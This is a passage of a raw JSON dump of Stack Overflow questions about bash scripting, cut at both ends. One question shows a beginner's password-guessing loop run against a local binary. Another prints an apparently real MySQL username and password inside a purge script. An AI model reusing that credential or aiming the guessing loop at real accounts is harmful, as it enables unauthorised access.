  done \n</code></pre>\n\n<p>and the text file\nlocation.txt</p>\n\n<pre><code>   /apps/IBM\n   /usr/home\n   /var/login\n</code></pre>\n\n<p>Can some one tell me what I did wrong? \nI may have made one stupid error that i don't know...(I'm really new in UNIX)</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","awk","printf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12627710,"title":"bash variable as awk field width","body":"<p>I have a variable: <code>n=$maxlen</code>, is there any way I can use that as the field width when using printf in awk?</p>\n\n<p>Something like this:</p>\n\n<pre><code>n=$maxlen\nawk -v val=$n -F',' '{printf \"%vals %7s %17s %4i\\n\", $1, $2, $3, $4}' somefile.txt\n</code></pre>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12622583,"title":"How can I intercept commands that contain a certain string?","body":"<p>Sometimes, it happens to me that I'm executing certain commands, and only afterwards I realize that I sent the wrong parameter to a command ( like a restart of a Heroku application ). I'd like to modify bash in such a way that if it sees a command containing a certain string, it will prompt me whether I'm sure or not. For example ( imagine the string is tempus ):</p>\n\n<pre><code>$ heroku restart --app tempus\n</code></pre>\n\n<p>Now, I'd like bash to prompt me with a Y/N prompt, and if I type <code>y</code>, only then I'd like it to execute the command. If I type N, the command will not be executed. How could I handle this problem?</p>\n"},{"tags":["php","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":46,"score":-4,"question_id":12627349,"title":"Tranlsate bash code to php","body":"<p>How would I perform the following command in php?</p>\n\n<pre><code>grep -l distribution-list * | sort -u &gt;&gt; myfile.xml \n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":12624414,"title":"Files open in the current session","body":"<p>I need to count the open files for the active processes in the current session. But Only regular files. I don´t know how to \"mix\" the ps command with the lsof command.\nLsof doesn´t return which processes belong to the current session. And when i use ps to list the active processes, i dont know how to save the pids to look it for with the lsof command.</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12621767,"title":"How to exit bash mode on server","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10523431/exit-bash-mode\">Exit Bash Mode?</a>  </p>\n</blockquote>\n\n\n\n<p>Every time I enter my server I am now in Bash mode.</p>\n\n<p>I don't want to be in bash mode because in it I don't have my current path on my left.</p>\n\n<p>This question has already been asked here:\n<a href=\"http://stackoverflow.com/questions/10523431/exit-bash-mode#comment16992733_10523431\">Exit Bash Mode?</a><br>\nbut OP accepted an answer that isn't really an answer.</p>\n\n<p>I have already tried 'reset' and removing my .bashrc file.</p>\n"},{"tags":["bash","terminal","clear"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":756,"score":2,"question_id":6367046,"title":"\"CLS\" Equivalent in BASH?","body":"<p>How do you clear the entire terminal in BASH, like the command prompt's <code>cls</code> command?</p>\n\n<p><code>clear</code> doesn't work because it doesn't actually clear anything, it just scrolls down.</p>\n"},{"tags":["linux","bash","shell"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":150,"score":1,"question_id":12523872,"title":"Bash script to get all ip addresses","body":"<p>I am trying to write a <code>bash</code> script to get all IP addresses on a server. The script should work on all major distros. Here is what I have:</p>\n\n<pre><code>ifconfig | grep 'inet addr:' | awk {'print $2'}\n</code></pre>\n\n<p>Resulting in:</p>\n\n<pre><code>addr:10.1.2.3\naddr:50.1.2.3\naddr:127.0.0.1\n</code></pre>\n\n<p>How can I first remove the <code>addr:</code> prefix? Second, how I can exclude <code>127.0.0.1</code>? Thanks.</p>\n"},{"tags":["bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12620965,"title":"bash - For every file in a directory, copy it into another directory, only if it doesn't exists there already","body":"<p>Thank you very much in advance for helping!</p>\n\n<p>I have a directory with some html files</p>\n\n<pre><code>$ ls template/content/html\ndevel.html\nidex.html\ndevel_iphone.html\ndevel_ipad.html\n</code></pre>\n\n<p>I'd like to write a bash function to copy every file in that folder into a new location (introduction/files/), ONLY if a file with the same name doesn't exist already there.</p>\n\n<p>This is what I have so far:</p>\n\n<pre><code>orig_html=\"template/content/html\";\ndest_html=\"introduction/files/\";\n\nfunction add_html {\n    for f in $orig_html\"/*\";\n    do\n        if [ ! -f SAME_FILE_IN_$dest_html_DIRECTORY ];\n        then\n            cp $f $dest_html;\n        fi\n    done\n}\n</code></pre>\n\n<p>The capital letters is where I was stuck.</p>\n\n<p>Thank you very much.</p>\n"},{"tags":["bash","scripting","sed","gnuplot"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":106,"score":2,"question_id":12223772,"title":"Scripting with gnuplot--where sed ","body":"<p>So I'm looking for some quick-and-dirty solution.</p>\n\n<p><strong>The problem:</strong>  </p>\n\n<p>I am trying to plot a specific section of a data file with gnuplot.  This is fine.  The basic line goes something like</p>\n\n<pre><code>plot \"&lt;(sed -n '1,100p' pointsandstuff.dat)\" u 1:log($4**2+$5**2) notitle\n</code></pre>\n\n<p>This works just fine.  The next step I want is to include in my title another part of the data, namely the data entry $3 (which for the points listed is identical, so I can parse it from anywhere).  I run into problem because, while plot seems fine, I can't seem to feed regex info into 'title'.  An example of something that <em>doesn't</em> work\"</p>\n\n<pre><code>plot \"&lt;(sed -n '1,100p' pointsandstuff.dat)\" u 1:log($4**2+$5**2) title \"&lt;(sed -n '1,1p' pointsandstuff.dat)\"\n</code></pre>\n\n<p>(This would spit out a whole data line, in theory, though in practice I just get the title \"&lt;(sed...\")</p>\n\n<p>I tried attacking this with a bash script, but the '$'s that I use throw the bash script into a tizzy:</p>\n\n<pre><code>#!/bin/bash\n\n\nSTRING=$(echo|sed -n '25001,25001p' pointsandstuff.dat)\necho $STRING\n\n\n gnuplot -persist &lt;&lt; EOF\n set xrange[:] noreverse nowriteback\n set yrange[:] noreverse nowriteback\n\n eval \"plot \"&lt;(sed -n '25001,30000p' pointsandstuff.dat)\" u 1:log($4**2+$5**2) title $STRING\n\n\nEOF\n</code></pre>\n\n<p>Bash won't know what to do with '$4' and '$5'.  </p>\n"},{"tags":["ruby","bash","command","execute"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1322,"score":2,"question_id":8159014,"title":"ruby execute bash command with variables","body":"<p>I need to execute a bash command in a ruby script. I know that there are about 6 ways to do this according to <a href=\"http://tech.natemurray.com/2007/03/ruby-shell-commands.html\" rel=\"nofollow\">http://tech.natemurray.com/2007/03/ruby-shell-commands.html</a> and a few other googled sources. with my code sample below, can anyone see a problem?</p>\n\n<pre><code>print \"enter myid: \"\nmyID = gets\nmyID = myID.downcase\nmyID = myID.chomp \nprint \"enter host: \"\nhost = gets\nhost = host.downcase\nhost = host.chomp \nprint \"winexe to host: \",host,\"\\n\"\ncommand = \"winexe -U domain\\\\\\\\\",ID,\" //\",host,\" \\\"cmd\\\"\"\nexec command \n</code></pre>\n"},{"tags":["bash","shell","unix"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12623064,"title":"Listing files using Sh","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3495609/get-the-newest-file-based-on-timestamp\">Get the newest file based on timestamp</a>  </p>\n</blockquote>\n\n\n\n<p>I primary want to select latest dump file from specific folder so i can store in variable and use it import using import script</p>\n\n<p>I want to list specific files from a specific, I tried:</p>\n\n<pre><code>a= $(ls -ltr /home/oracle/testora/MAUL01*.dmp | awk '{print $9}' | tail -1)\necho $a\n</code></pre>\n\n<p>I want output as:</p>\n\n<pre><code>MAUL01.DP.09-27-2012_09_15.dmp\n</code></pre>\n\n<p>instead of:</p>\n\n<pre><code>/home/oracle/testora/MAUL01.DP.09-27-2012_09_15.dmp\n</code></pre>\n\n<p>Problems:\nls is not working for me inside sh (working fine from unix)\nfile name is shown with path (I trid using basename, but cannot make it work)</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12622415,"title":"bash - For each directory in a folder, make a directory within a different location","body":"<p>I have a directory which contains several folders.\nI'd like to make a bash script to create directories with the same name in a different location.</p>\n\n<p>Note that I don't want to copy the folder structure, neither copy or move the folders. I just want to create folders with the same name in a different location.</p>\n\n<p>I'm stuck. Using this:</p>\n\n<pre><code>for d in \"template/modules/*\"\ndo\n    # mkdir $(basename \"$d\");\n    echo $d;\n    echo \"$d\";\n    echo $(basename \"$d\");\ndone\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>template/modules/introduction template/modules/kitchen template/modules/test\ntemplate/modules/*\nadd_module.sh template\n</code></pre>\n\n<p>Any ideas?</p>\n\n<p>Cheers</p>\n"},{"tags":["php","linux","bash","swi-prolog"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":113,"score":4,"question_id":12543064,"title":"Can't run bash script in PHP","body":"<p>I'm trying to run bash script in PHP but can't run it.\nphp -v</p>\n\n<pre><code>PHP 5.3.10-1ubuntu3.2 with Suhosin-Patch (cli) (built: Jun 13 2012 17:19:58)\nCopyright (c) 1997-2012 The PHP Group\nZend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies\n</code></pre>\n\n<p>Ubuntu 12.04 LTS 64 bit.</p>\n\n<p>My php code:</p>\n\n<pre><code>    $cmd='/www/var/pl/bash.sh';\n    $retval =-1;\n    exec( $cmd, $output ); //executing the exec function.\n    foreach( $output as $tmp ) \n    { \n        echo \"$tmp &lt;br&gt;\"; \n    };\n</code></pre>\n\n<p>bash.sh:</p>\n\n<pre><code> #!/bin/bash\nswipl --quiet -s /var/www/pl/ples.pl -g \"f(R, gel), writeln(R),open('/var/www/pl/in.txt',write, Stream),\nwrite(Stream, (R)),\nnl(Stream),\nclose(Stream)\" -t halt.\n</code></pre>\n\n<p>What am I doing wrong?</p>\n\n<p>And I can run bash.sh in the Linux terminal.</p>\n"},{"tags":["mysql","bash","mysqlclient"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12621643,"title":"Output all tables from a database in n columns","body":"<p>I'm having a stupid problem here. It's not such a big deal, but as I have it almost every day, I'm looking for a workaround.</p>\n\n<p>I'm dealing on a project which as roughtly 250 tables. I quite often need to see the list of those, but when I launch \"show tables;\", MySQL outputs it 1 column per line.</p>\n\n<p>Here is a quick sample : </p>\n\n<pre><code>| contact                              |\n| content_footer                       |\n| content_footer_translation           |\n| content_homepage                     |\n| content_homepage_image               |\n| content_homepage_translation         |\n</code></pre>\n\n<p>What I would like is to be able to display it in n columns by defining n myself, or even better, n should be calculated in a way so that the line width won't excess X characters.</p>\n\n<p>Expected output:</p>\n\n<pre><code>| contact                              | content_footer                       | content_footer_translation           |\n| content_homepage                     | content_homepage_image               | content_homepage_translation         |\n</code></pre>\n\n<p>I'm not sure it's really possible to do that purely in MySQL, but if you know a nice one-liner which can do that in Bash, it's fine too :)</p>\n"},{"tags":["bash","pattern-matching"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12619720,"title":"multiline regexp matching in bash","body":"<p>I would like to do some multiline matching with bash's <code>=~</code></p>\n\n<pre><code>#!/bin/bash\nstr='foo = 1 2 3\nbar = what about 42?\nboo = more words\n'\nre='bar = (.*)'\nif [[ \"$str\" =~ $re ]]; then\n        echo \"${BASH_REMATCH[1]}\"\nelse\n        echo no match\nfi\n</code></pre>\n\n<p>Almost there, but if I use <code>^</code> or <code>$</code>, it will not match, and if I don't use them, <code>.</code> eats newlines too.</p>\n\n<p>EDIT:</p>\n\n<p>sorry, values after <code>=</code> could be multi-word values.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12614318,"title":"Shell script password bruteforcing","body":"<p>Hi first of all apologies if this is poorly worded, will try to explain clearly.</p>\n\n<p>I have a binary named testpassword, usage is probably fairly explanatory.  goes as follows</p>\n\n<pre><code>./testpassword hello\n</code></pre>\n\n<p>if hello is <strong>correct</strong> password then output will be</p>\n\n<pre><code>pass=correct\n</code></pre>\n\n<p>if hello is <strong>incorrect</strong> password, output will be</p>\n\n<pre><code>pass=incorrect\n</code></pre>\n\n<p>I'm a complete beginner at Linux and shell scripting but made a very crude + simple script called bruteforce.sh. to perform a 'brute force' attack with a list of words. contents is as follows</p>\n\n<pre><code>./testpassword hello\n./testpassword jelly\n./testpassword watermelon\n./testpassword anotherword  \netc..\n</code></pre>\n\n<p>I ran the following in a new script after quite a bit of goggling for a very rough way to notify me when it's successful</p>\n\n<pre><code>./bruteforce.sh 2 2&gt;&amp;1 &gt;/dev/null | grep -n pass=correct\n</code></pre>\n\n<p>the output will be something like <code>12: pass=correct</code>. where 12 is the line number in bruteforce.sh </p>\n\n<p>when I see this on screen I can ctrl-c and run</p>\n\n<pre><code>awk 'NR==12' bruteforce.sh\n</code></pre>\n\n<p>to get the correct pass corresponding to the line number. I was just wondering if there is an easier or cleaner way to do any part of this </p>\n\n<p>Thanks in advance for any suggestions</p>\n"},{"tags":["bash","shell","date"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":12616623,"title":"Command not found on bash function call","body":"<p>Hi i'm new to bash scripting but cannot understand why i get the <em>command not found</em> error when i try to assign to a local variable the result of this function call with parameters 20120920 5. </p>\n\n<pre><code>    #!/bin/bash\n\nfunction nDaysAgo () #date # daysago\n{\n date -d \"${1} - ${2} days\" +%Y%m%d;\n}\n</code></pre>\n\n<p>so the script name is ndaysago, i'm first invoking the script with . ndaysago and then assigning the value like this:</p>\n\n<pre><code>newdate= nDaysAgo 20120910 5\n</code></pre>\n\n<p>it prints: 20120905: command not found</p>\n\n<p>Meaning that the date execution is made but then tries to use the output as command, thats not what i would expect.</p>\n\n<p>i have also tried assigning the new value to a variable within the function like so:</p>\n\n<pre><code>#!/bin/bash\n\nfunction nDaysAgo () #date # daysago\n{\n var=$(date -d \"${1} - ${2} days\" +%Y%m%d)\n}\n</code></pre>\n\n<p>but still nothing, mmmmmm</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12614011,"title":"Using Case for Range of Numbers in Bash","body":"<p>I am trying to do the following using CASE in Bash (In Linux)</p>\n\n<p>If X is between 460 and 660, output X information.</p>\n\n<p>If X is between 661 and 800, do something else.</p>\n\n<p>Etc..</p>\n\n<p>Right now this is what I have:</p>\n\n<pre><code>case $MovieRes in\n    [461-660]*) echo \"$MovieName,480p\" &gt;&gt; moviefinal ;;\n    [661-890]*) echo \"$MovieName,720p\" &gt;&gt; moviefinal ;;\n    [891-1200]*) echo \"$MovieName,1080p\" &gt;&gt; moviefinal ;;\n    *) echo \"$MovieName,DVD\" &gt;&gt; moviefinal ;;\nesac\n</code></pre>\n\n<p>But somehow many of the ones that are 480p, 720p or 1080p are ending with DVD instead. The variable $MovieRes is a simple list that shows, for each line, a number between 1 and 1200. Depending on the value, CASE decides which \"case\" to apply.</p>\n\n<p>I would like to know how to actually use CASE to accomplish this since it is a bit confusing when dealing with ranges like this.</p>\n\n<p>As a side note, any site that has tutorials on how to use CASE (In Bash) would help also.</p>\n"},{"tags":["python","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":508,"score":2,"question_id":1979497,"title":"Split a database of mol2 molecules into N smaller sets","body":"<p>I got a big set of molecules from the zinc database (http://zinc.docking.org/), in mol2 (http://tripos.com/index.php?family=modules,SimplePage,,,&amp;page=sup_mol2&amp;s=0) format. I would like to be able to split this database into an arbitrary set of N smaller databases. What is the best scripting approach in either python, bash or perl for this? I read about openbabel, but it can only generate sets of individual molecules.</p>\n\n<p>If not, I can also convert mol2 to another more convenient format</p>\n\n<p>Thaks</p>\n"},{"tags":["bash","source-code","terminal","lines-of-code"],"answer_count":7,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":923,"score":3,"question_id":4535183,"title":"How to calculate the number of lines in source code","body":"<p>As the title says how i can calculate the total number of lines in a source code folder using bash commands</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":517,"score":1,"question_id":8523147,"title":"Script to do incremental backups with rsync","body":"<p>Could someone help me with a bash script in linux to make backups. would have to do a full backup every week and every day an incremental.</p>\n"},{"tags":["regex","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12614267,"title":"bash extended regex operators","body":"<p>I am trying to use the extended regex operators available in bash (?, *, +, @, !). The manual says I just have to enclose with parentheses a list of patterns, then use the operator before the left bracket. So if I want a pattern of zero or more a's:</p>\n\n<pre><code>if [[ \"$1\" =~ *(a) ]]\nthen\n   echo $1\nfi\n</code></pre>\n\n<p>but this is not working. What am I doing wrong?</p>\n"},{"tags":["c","bash","make","ubuntu-12.04"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12613598,"title":"How to interpret this output generated by make command?","body":"<p>On running make command, I get the following output,</p>\n\n<pre><code>g++ -DUNIX -Wall -g -I../include -I. main.o hfpage.o hfp_driver.o                      test_driver.o db.o new_error.o page.o system_defs.o buf.o -o hfpage \n\n/usr/bin/ld: Warning: size of symbol `error_string_table::error_string_table(Status, char const**)' changed   from 18 in db.o to 34 in buf.o\n/usr/bin/ld: i386:x86-64 architecture of input file `buf.o' is  incompatible with i386 output\ncollect2: ld returned 1 exit status\nmake: *** [hfpage] Error 1\n</code></pre>\n\n<p>This file generates hfpage.o which when I try to run using <code>./hfpage.o</code> I get and error message <code>bash: ./hfpage.o: cannot execute binary file</code>.</p>\n\n<p>Is there something wrong with my system?</p>\n"},{"tags":["perl","bash","ubuntu","command"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":12610873,"title":"How to make this command safe, and work for quoted strings","body":"<p>I found (and adapted a bit) a command to edit a list of files using regex (and perl). I put it into a script file called <code>cred</code>, so I can do <code>cred . england England</code> to replace all occurrences of <code>england</code> with <code>England</code> in all files in the current directory.</p>\n\n<pre><code>find $1 -type f -exec perl -e 's/'$2'/'$3'/g' -p -i {} \\;\n</code></pre>\n\n<p>It is wicked powerful, and already useful - but dangerous, and flawed. I would like it to...</p>\n\n<ol>\n<li>preview changes (or at least files operated on) first, asking confirmation</li>\n<li>work with longer strings than a single word. I tried <code>cred . england 'the United Kingdom'</code> but it fails</li>\n</ol>\n\n<p>I would also be interested in other (short and memorable, universally installed/installable on osx and ubuntu) commands to achieve the same thing.</p>\n\n<p>EDIT:</p>\n\n<p>This is what I have so far - open to improvements...</p>\n\n<pre><code># highlight the spots that will be modified (not specifying the file)\nfind $1 -type f -exec grep -E \"$2\" --color {} \\;\n# get confirmation\nread -p \"Are you sure? \" -n 1 -r\nif [[ $REPLY =~ ^[Yy]$ ]]\nthen\n  # make changes, and highlight the spots that were changed\n  find $1 -type f -exec perl -e \"s/$2/$3/g\" -p -i {} \\;\n  echo \"\"\n  find $1 -type f -exec grep -E \"$3\" --color {} \\;\nelse\n  echo \"\"\n  echo \"Aborted!!\"\nfi\n</code></pre>\n"},{"tags":["facebook","git","api","bash","heroku"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":186,"score":0,"question_id":12613253,"title":"Heroku Toolbelt - git: Command not found","body":"<p>I'm working on Mac OSX (10.6.8), and I've just installed the Heroku toolbelt, with hopes of trying to mess around making facebook apps.  I've created a facebook app and according to Heroku's instructions, I should just be able to edit it by entering this into my command line:</p>\n\n<pre><code>git clone git@heroku.com:false-title-1234.git -o heroku\n</code></pre>\n\n<p>The Heroku Toolbelt is installed and I am logged in.  But when I run the command above I get this error:</p>\n\n<pre><code>-bash: git: command not found\n</code></pre>\n\n<p>I didn't have git before, and apparently I still do not have it.  But I thought it came as part of the Heroku toolbelt?  It seems like, for everyone else on the internet, the git part of it \"just works,\" because I'm not able to find references to problems with the git component of the heroku toolbelt. Any ideas as to what I'm doing wrong?  </p>\n"},{"tags":["mysql","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12609798,"title":"MySQL purging shell script","body":"<p>I have a mysql table with 120 million rows and I want to write a shell script to start purging some of that useless information in that table that's not needed. Problem is I'm super new to shell scripting.</p>\n\n<p>I have a <code>datetime</code> column with a unix timestamp in it. I want to delete every row that's not within the last 2 months since I've recently enacted a data retention policy that will allow me to only keep 2 months of certain data. </p>\n\n<p>TL;DR Need to build a shell script that deletes all rows up until the last 2 months of data by using the unix timestamp in the <code>datetime</code> column.</p>\n\n<p>UPDATE: Here's my new shell script</p>\n\n<pre><code>#!/bin/sh\n\ni=1\nwhile [ \"$i\" -ne 0 ]\ndo\n  i=mysql -h 127.0.0.1 -u halo_ylh -pCa5d8a88 halo_twittstats &lt; mysqlpurge.sql\n  sleep 10\ndone\n</code></pre>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12606688,"title":"In bash, how do I force variable never to be interpreted as a list?","body":"<p>In my <code>bash</code> scripts, I regularly use file paths which may contain spaces:</p>\n\n<pre><code>FOO=/path\\ with\\ spaces/\n</code></pre>\n\n<p>Later, if I want to use <code>FOO</code>, I have to wrap it in quotes (<code>\"$FOO\"</code>) or it will be interpreted as a list (<code>/path</code>, <code>with</code>, <code>spaces/</code>). Is there a better way to force a variable never to be interpreted as a list? It is cumbersome to have to constantly quote-wrap.</p>\n"},{"tags":["python","bash","file-io","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12609877,"title":"output file to another directory","body":"<p>I have a python script and I wrote it such that it will generate an output file to a new directory called <code>test</code> using these two lines:</p>\n\n<pre><code>self.mkdir_p(\"test\") # create directory named \"test\"\nfile_out = open(\"test/\"+input,\"w\")\n</code></pre>\n\n<p>and the mkdir_p function is as follow:</p>\n\n<pre><code>def mkdir_p(self,path):\n    try:\n        os.makedirs(path)\n    except OSError as exc:\n        if exc.errno == errno.EEXIST:\n            pass\n        else: raise\n</code></pre>\n\n<p>Now, I have all the files that I would like my script to run on stored in directory called <code>storage</code>, and my question is, how can I write a script such that I can run all the files in <code>storage</code> from my home directory(where my python script is located), and saved all the output to the <code>test</code> directory as I coded in my python script?</p>\n\n<p>I did a naive approach in bash like:</p>\n\n<pre><code>#!/bin/bash\n\n# get the directory name where the files are stored (storage)\nin=$1\n\n# for files in (storage) directory\nfor f in $1/*\n\ndo\n\n  echo \"Processing $f file...\"\n  ./my_python_script.py $f\n\ndone\n</code></pre>\n\n<p>and it didnt work and threw IOError: <code>No such file or directory: 'test/storage/inputfile.txt'</code></p>\n\n<p>I hope I explained my problem clear enough.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":12607957,"title":"Correct way symlinking a folder into other folders dynamically","body":"<p>I have a folder which contains my application. I then have a flexible number of folders in another directory, called “sites”. It looks like this:</p>\n\n<pre><code>+ -Application\n+ -- Test.html\n+ -- CSS\n+ --- Style.css\n\n+ -Sites \n+ --Site1\n+ --Site2\n</code></pre>\n\n<p>I want to symlink all the files in the application folder into every folder found under the sites folder. So, the end result would look like this:</p>\n\n<pre><code>+ -Sites \n+ --Site1\n+ -- Test.html\n+ -- CSS\n+ --- Style.css\n+ --Site2\n+ -- Test.html\n+ -- CSS\n+ --- Style.css\n</code></pre>\n\n<p>So I think the first step is loop for all folders found in the Sites folder, then to execute a symlink on everything in the folder. I cant really code but from my reading something like this might be a starting point?</p>\n\n<pre><code>find ./* -type d |\nwhile read LINE\ndo\n        echo ln -s /absolute/path/to/files/* \"$LINE\"\ndone\n</code></pre>\n"},{"tags":["linux","bash","find","xargs"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12598884,"title":"Finding files by creation time of another file","body":"<p>What I need to do is find files by the creation time of another file. For example if i create a file at 9am and later i wanted to find all the files created 1 hour after it or 1 hour before it. How would i do that?</p>\n\n<p>I've tried experimenting with \"-newer\" whilst using \"find\" but I think \"xargs\" is what i need to be using.</p>\n\n<p>Thanks </p>\n"},{"tags":["bash","curl","terminal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12608373,"title":"Sending POST via CURL error","body":"<p>I am trying to send a HTTP POST via CURL on the command line. I am doing something wrong. Could someone advise me on what's wrong with my command? I am doing the following:</p>\n\n<pre><code>curl -X POST -H \"Content-Type:application/json\" https://www.url-here.com -d {JSON OBJECT HERE}\n</code></pre>\n"},{"tags":["bash","progress-bar","cancel","zenity"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1296,"score":2,"question_id":4907381,"title":"Bash, zenity progress bar without cancel","body":"<p>Currently developing a small bash script, my needs are a progress bar that doesn't \ncome with a cancel button. I have been looking into the zenity progress bar, but \nhaven't found a way to get rid of the cancel button.</p>\n\n<p>The non-existence of the cancel button is of the essence, since it would completely ruin\nthe means of the progress bar. I saw a terminal-based progress bar around, but since I use\nzenity dialogs for all other cases, I want to use it for the progress bar as well.</p>\n\n<p>Any idéas how to solve my issue? Any other progress bars around, or is it possible to \nget rid of the cancel button? </p>\n\n<p>Any help is very appreciated, thanx!</p>\n"},{"tags":["bash","osx","applescript","beep"],"answer_count":7,"favorite_count":6,"up_vote_count":19,"down_vote_count":0,"view_count":8756,"score":19,"question_id":3127977,"title":"How to make the hardware beep sound in Mac OS X 10.6","body":"<p>I just want that Mac OS X 10.6 does a hardware beep sound like in open suse and other distributions. I tried following approaches</p>\n\n<p>Terminal -> beep = -bash: beep: command not found</p>\n\n<p>Terminal -> say beep = voice speaks out beep (Not a Hardware beep but awesome ;) )</p>\n\n<p>applescript -> beep = Macintosh bell (I want a Hardware beep!)</p>\n\n<p>Does anybody know how to make the Hardware beep in bin/bash or applescript?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12607828,"title":"Moving each file into its own directory","body":"<p>I'm trying to write a script where I have multiple files in a directory but I want to make a directory for each file with a particular extension(without the file extension in the directory name) and move each file into their own directory and then do something to each file in its respective directory.\n I'm really new to this so this is as far as I've gotten and it doesn't work so any help would be appreciated!</p>\n\n<pre><code>for file in *;\n     do\n        if  [ $file=[$.sff]] ; then\n          mkdir ${$file/.sff/\"\"/}\n          mv $file ${file/.sff/\"\"/}/\n            fi\n        for $file in $file/\n              do { ......\n            }\ndone\n</code></pre>\n"},{"tags":["java","perl","bash","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12174161,"title":"Perl issues bash pipe into Java","body":"<p>I am a Perl beginner. I have this Perl snippet</p>\n\n<pre><code>$normal_pileup = \"samtools mpileup -q 1 -f XXXX YYYYY\";\n$tumor_pileup = \"samtools mpileup -q 1 -f XXXX ZZZZZ\";\n\nbash -c \\\"java -jar ttt.jar  &lt;\\($normal_pileup\\) &lt;\\($tumor_pileup\\) output\n</code></pre>\n\n<p>They try to issue a system call that pipes input from these commands into a Java program. I couldn't make it work. Can anybody please tell me how to do it?</p>\n"},{"tags":["bash","shell","bourne-shell"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2817,"score":5,"question_id":3980668,"title":"How to get a password from a shell script without echoing","body":"<p>I have a script that automates a process that needs access to a password protected system. The system is accessed via a command-line program that accepts the user password as an argument.</p>\n\n<p>I would like to prompt the user to type in their password, assign it to a shell variable, and then use that variable to construct the command line of the accessing program (which will of course produce stream output that I will process).  </p>\n\n<p>I am a reasonably competent shell programmer in Bourne/Bash, but I don't know how to accept the user input without having it echo to the terminal (or maybe having it echoed using '*' characters).  </p>\n\n<p>Can anyone help with this?</p>\n"},{"tags":["bash","shell","script","awk"],"answer_count":7,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":90,"score":4,"question_id":12603606,"title":"Need to parse a log file in bash","body":"<p>I have a log file that contains a lot of text, some of it is useless. In this log there are some lines that are important for me. The pattern for those lines are:</p>\n\n<pre><code> 0x00000001 (NEEDED)                     Shared library: [libm.so.6]\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x00000001 (NEEDED)                     Shared library: [ld.so.1]\n 0x00000001 (NEEDED)                     Shared library: [libgcc_s.so.1]\n</code></pre>\n\n<p>The NEEDED keyword could be found on all lines that are important for me. The keyword between [] is the one important for me. I need to create a list of all those strings, without repeating them.</p>\n\n<p>I've done this on Python, but looks like on the machine I want to run the script there is no Python available, so I need to rework the script in bash. I know only basic stuff in bash and I'm not able to find a solution for my problem.</p>\n\n<p>The Python script I've used is:</p>\n\n<pre><code>import sys\nimport re\n\n\ndef testForKeyword(keyword, line):\n    findStuff = re.compile(r\"\\b%s\\b\" % keyword, \\\n                                   flags=re.IGNORECASE)\n\n    if findStuff.search(line):\n        return True\n    else:\n        return False\n\n# 